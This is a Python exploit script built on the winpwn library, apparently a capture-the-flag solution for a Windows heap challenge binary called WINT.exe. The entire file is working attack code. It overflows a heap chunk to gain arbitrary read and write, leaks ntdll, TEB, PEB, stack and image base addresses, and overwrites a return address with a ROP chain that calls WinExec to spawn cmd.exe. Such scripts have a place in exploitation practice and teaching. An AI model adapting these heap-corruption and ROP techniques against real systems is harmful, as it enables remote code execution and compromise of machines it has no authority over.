"""
    exp tested in windows 10 pro(10.0.19041.508)
"""

from winpwn import *
ru=lambda s:p.recvuntil(s)
rl=lambda :p.recvline()
rul=lambda s:p.recvuntil(s+'\n')
sl=lambda s:p.sendline(str(s))
sd=lambda s:p.send(str(s))
rn=lambda n:p.recvn(n)

def run(ip=None,port=None):
    global p,is_debug
    if ip and port:
        is_debug=False
        p=remote(ip,port)
    elif libpath and binarypath:
        p=process(binarypath,env={'LD_PRELOAD':libpath})
    else:
        p=process(binarypath)

def debugf(s=''):
    if is_debug:
        windbgx.attach(p,s)

def menu(i):
    ru("Exit\r\n")
    sl(i)
def add(name,size,data):
    menu(1)
    ru("name: ")
    sl(name)
    ru("age: ")
    sl(size)
    ru("data: ")
    sd(data)
def delete(i):
    menu(2)
    ru("index: ")
    sl(i)
def show(i):
    menu(3)
    ru("index: ")
    sl(i)
def edit(i,name,size,data):
    menu(4)
    ru("index: ")
    sl(i)
    ru("name: ")
    sl(name)
    ru("age: ")
    sl(size)
    ru("data: ")
    sd(data)
def exp(ip=None, port=None):
    run(ip=ip, port=port)
    add("1",0x18,"cmd.exe\x00"*3) # 0
    add("1",0x18,"cmd.exe\x00"*3) # 1
    add("1",0x18,"cmd.exe\x00"*3) # 2
    payload="c"*0x20
    payload+=p64(0x0)+p64(0x0)+p64(0)+p64(0)+p8(0x40)
    edit(0,"1",len(payload),payload)
    show(1)
    ru("age: ")
    rl()
    heap_addr=u64(rn(8))

    def leak(where,length=8):
        payload="c"*0x20
        payload+=p64(0x0)+p64(0x0)+p64(0)+p64(0)+p64(where)+p64(length)
        edit(0,"1",len(payload),payload)
        show(1)
        ru("age: ")
        rl()
        addr=u64(rn(8))
        return addr
    # main_heap_addr=leak(heap_addr-0x100)
    ntdll=leak(heap_addr-0x6a0)-0x168ed0
    pebLdr_addr=ntdll+0x16a4c0
    teb=leak(pebLdr_addr-0x78)+0xf80
    peb=teb-0x1000
    print(hex(heap_addr),hex(ntdll),hex(teb),hex(peb))
    stack_addr=leak(teb+0x8)
    print("stack: ",hex(stack_addr))
    bin_base=leak(peb+0x10)
    print("bin_base: ",hex(bin_base))
    winexec=leak(bin_base+0x34000)-0x24e80+0x65fc0
    ret_addr=bin_base+0xdd34
    while(True):
        stack_addr-=8
        addr=leak(stack_addr)
        if ret_addr==addr:
            break
    print(hex(stack_addr))
    pop_rcx_ret=bin_base+0x1f690
    pop_rdx_ret=bin_base+0x1f342
    ret=bin_base+0x1199
    # debugf("bp wint+0x23A1")
    print(hex(heap_addr),hex(ntdll),hex(teb),hex(teb),hex(stack_addr),hex(bin_base),hex(winexec))
    def writeTo(where):
        rop=p64(pop_rcx_ret)+p64(heap_addr)+p64(pop_rdx_ret)+p64(1)+p64(ret)+p64(winexec)
        payload="c"*0x20
        payload+=p64(0x0)+p64(0x0)+p64(0)+p64(0)+p64(where)+p64(len(rop))
        edit(0,"1",len(payload),payload)
        edit(1,"1",len(rop),rop)
    writeTo(stack_addr)
    menu(5)
    # debugf()
    p.interactive()

# context.terminal=['tmux','new-window']
# context(log_level='debug',os='linux',arch='amd64')
context.log_level="debug"
context.arch="amd64"
# context(log_level='debug',os='linux',arch='i386')
context.aslr=True
p=None
libpath=None
binarypath=["./WINT.exe"]
is_debug=True
exp()